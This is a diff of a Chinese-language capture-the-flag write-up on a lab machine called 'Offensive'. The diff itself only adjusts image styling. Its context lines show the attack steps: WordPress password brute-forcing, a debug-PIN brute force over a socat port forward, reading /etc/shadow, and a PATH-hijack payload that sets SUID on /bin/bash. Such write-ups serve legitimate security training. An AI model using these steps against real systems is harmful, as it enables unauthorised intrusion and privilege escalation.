@@ -185,7 +185,7 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 10.68 s
 <hr>
 <h2>2.踩点</h2>
 <h3>80端口</h3>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/819ee2bc-b088-4fae-bf3a-085e6092abf4"><img src="https://github.com/user-attachments/assets/819ee2bc-b088-4fae-bf3a-085e6092abf4" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/819ee2bc-b088-4fae-bf3a-085e6092abf4"><img src="https://github.com/user-attachments/assets/819ee2bc-b088-4fae-bf3a-085e6092abf4" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>明显可以看出有一个域名<code class="notranslate">offensive.thl</code>加入我们的hosts文件中，继续踩点可以发现，这个网页是个博客，那我们探测一下架构。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">└─$ whatweb http://offensive.thl/       
 http://offensive.thl/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.205.220], MetaGenerator[WordPress 6.7.1], Script, Title[rodgar], UncommonHeaders[link], WordPress[6.7.1]
@@ -395,11 +395,11 @@ Finished
 ===============================================================
 </pre></div>
 <p>查看一下帮助。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/aa4bd96d-99b6-4f0c-b204-76a776e4eddb"><img src="https://github.com/user-attachments/assets/aa4bd96d-99b6-4f0c-b204-76a776e4eddb" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/aa4bd96d-99b6-4f0c-b204-76a776e4eddb"><img src="https://github.com/user-attachments/assets/aa4bd96d-99b6-4f0c-b204-76a776e4eddb" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>可以下载、查看、删除，但是限制在<code class="notranslate">/var/www</code>，那我们查看一下有什么文件。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/82d60f3a-df63-4105-b95a-8121ca79dea5"><img src="https://github.com/user-attachments/assets/82d60f3a-df63-4105-b95a-8121ca79dea5" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/82d60f3a-df63-4105-b95a-8121ca79dea5"><img src="https://github.com/user-attachments/assets/82d60f3a-df63-4105-b95a-8121ca79dea5" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>有意思，我们看看<strong>wordress</strong>中有没有我们没有探测出来的<strong>plugins</strong>。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4bd23546-7d72-4ac2-9b55-f3d7b2fa032a"><img src="https://github.com/user-attachments/assets/4bd23546-7d72-4ac2-9b55-f3d7b2fa032a" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4bd23546-7d72-4ac2-9b55-f3d7b2fa032a"><img src="https://github.com/user-attachments/assets/4bd23546-7d72-4ac2-9b55-f3d7b2fa032a" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>真多啊，我比较对<code class="notranslate">akismet</code>、<code class="notranslate">wps-hide-login</code>、<code class="notranslate">wpterm</code>感兴趣，搜索一下他们有没有漏洞。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ searchsploit akismet
@@ -422,14 +422,14 @@ Exploits: No Results
 Shellcodes: No Results
                                 </pre></div>
 <p>只有一个跨站点，我们用不上，但是我发现了点问题，<code class="notranslate">wps-hide-login</code>是什么东西啊，触发了我关键词，搜索一下。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a014b2ce-d98a-4762-b648-65d6dbdb956b"><img src="https://github.com/user-attachments/assets/a014b2ce-d98a-4762-b648-65d6dbdb956b" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a014b2ce-d98a-4762-b648-65d6dbdb956b"><img src="https://github.com/user-attachments/assets/a014b2ce-d98a-4762-b648-65d6dbdb956b" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>原来就是你让我爆破不了[生气]，进你目录看看。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/40a293ec-8fc3-474b-92fe-4d19af4a276f"><img src="https://github.com/user-attachments/assets/40a293ec-8fc3-474b-92fe-4d19af4a276f" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/40a293ec-8fc3-474b-92fe-4d19af4a276f"><img src="https://github.com/user-attachments/assets/40a293ec-8fc3-474b-92fe-4d19af4a276f" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>得到了一个版本号，我去搜索了一下<code class="notranslate">wps-hide-login</code>的exploit，没有这个版本的，这个是最新版，难办了......</p>
 <p>我忽然想到一个问题，以前搭博客加插件的话，如果那个插件不要了，直接把那个目录删了它就会消失，我不知道<strong>WordPress</strong>是不是这种机制，试试吧，不行就重装</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ab524259-acc2-4c3f-820e-620e26da7e1b"><img src="https://github.com/user-attachments/assets/ab524259-acc2-4c3f-820e-620e26da7e1b" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ab524259-acc2-4c3f-820e-620e26da7e1b"><img src="https://github.com/user-attachments/assets/ab524259-acc2-4c3f-820e-620e26da7e1b" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>尝试可不可以登录。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b6592349-bf94-430b-ad0c-214e4b453084"><img src="https://github.com/user-attachments/assets/b6592349-bf94-430b-ad0c-214e4b453084" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b6592349-bf94-430b-ad0c-214e4b453084"><img src="https://github.com/user-attachments/assets/b6592349-bf94-430b-ad0c-214e4b453084" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>还真行，再爆破一次密码。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ wpscan --url http://offensive.thl:80 -U administrator -P /usr/share/wordlists/rockyou.txt --api-token xxx   <span class="pl-c"><span class="pl-c">#</span>api-token注册wpscan官网获取</span>
@@ -513,11 +513,11 @@ _______________________________________________________________
 正在保存至: “offensive.thl/index.html”
 </pre></div>
 <p>下载了一份网页没有结果，我记得好像那个API可以下载来着，下载一份下来。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/49ced356-5769-4985-b669-e50f078a45ab"><img src="https://github.com/user-attachments/assets/49ced356-5769-4985-b669-e50f078a45ab" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/49ced356-5769-4985-b669-e50f078a45ab"><img src="https://github.com/user-attachments/assets/49ced356-5769-4985-b669-e50f078a45ab" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>先帝创业未半而中道崩殂，mmp，那没办法了，就在这个API探索吧。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e2d52fcf-8201-41ec-9a5b-3c5551238f38"><img src="https://github.com/user-attachments/assets/e2d52fcf-8201-41ec-9a5b-3c5551238f38" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e2d52fcf-8201-41ec-9a5b-3c5551238f38"><img src="https://github.com/user-attachments/assets/e2d52fcf-8201-41ec-9a5b-3c5551238f38" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>在<code class="notranslate">/image/</code>目录下找到一个有意思的图片。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/15bb561b-0c31-4141-8f36-47cfb5b579d7"><img src="https://github.com/user-attachments/assets/15bb561b-0c31-4141-8f36-47cfb5b579d7" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/15bb561b-0c31-4141-8f36-47cfb5b579d7"><img src="https://github.com/user-attachments/assets/15bb561b-0c31-4141-8f36-47cfb5b579d7" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>啊这......属实是文化输出了，哈哈哈。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ wget http://offensive.thl/images/wp-login.jpg                     
@@ -826,11 +826,11 @@ MariaDB [wordpress]<span class="pl-k">&gt;</span> SELECT user_login, user_pass F
 <div class="highlight highlight-source-shell"><pre class="notranslate">www-data@TheHackersLabs-Offensive:/tmp$ socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:5000 <span class="pl-k">&amp;</span>
 [1] 20694
 </pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/df8f29f1-fe16-41a2-9bc6-66542f3465bb"><img src="https://github.com/user-attachments/assets/df8f29f1-fe16-41a2-9bc6-66542f3465bb" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/df8f29f1-fe16-41a2-9bc6-66542f3465bb"><img src="https://github.com/user-attachments/assets/df8f29f1-fe16-41a2-9bc6-66542f3465bb" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>爆破PIN,也就10000种可能（如果你是通过代理的形式转发端口如:<code class="notranslate">chisel</code>这种，我建议你直接抄我的PIN，因为代理巨慢，不要问为什么我知道，因为我一开始就是这样干的）</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/822a8467-e878-4a48-84a9-9f1c8fa38d1c"><img src="https://github.com/user-attachments/assets/822a8467-e878-4a48-84a9-9f1c8fa38d1c" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/822a8467-e878-4a48-84a9-9f1c8fa38d1c"><img src="https://github.com/user-attachments/assets/822a8467-e878-4a48-84a9-9f1c8fa38d1c" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>PIN为3333的时候长度明显不一样，所以就是3333。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d46a4cc8-8700-4796-baa2-336f1cda0846"><img src="https://github.com/user-attachments/assets/d46a4cc8-8700-4796-baa2-336f1cda0846" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d46a4cc8-8700-4796-baa2-336f1cda0846"><img src="https://github.com/user-attachments/assets/d46a4cc8-8700-4796-baa2-336f1cda0846" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>可以执行命令，弹个shell回来。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">maria@TheHackersLabs-Offensive:<span class="pl-k">~</span>$ id
 uid=1001(maria) gid=1001(maria) grupos=1001(maria)
@@ -942,7 +942,7 @@ head -n 8 /etc/shadow
 <span class="pl-s">.comment</span>
 <span class="pl-s"></span></pre></div>
 <p>像是执行了<code class="notranslate">head -n 8 /etc/shadow</code>，我们托去IDA一探真容。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b2985cc2-ac93-42bb-8b22-08668879ff48"><img src="https://github.com/user-attachments/assets/b2985cc2-ac93-42bb-8b22-08668879ff48" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b2985cc2-ac93-42bb-8b22-08668879ff48"><img src="https://github.com/user-attachments/assets/b2985cc2-ac93-42bb-8b22-08668879ff48" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>猜的没错，我们命令注入一下。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">maria@TheHackersLabs-Offensive:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod u+s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> head
 maria@TheHackersLabs-Offensive:<span class="pl-k">~</span>$ chmod +x head 
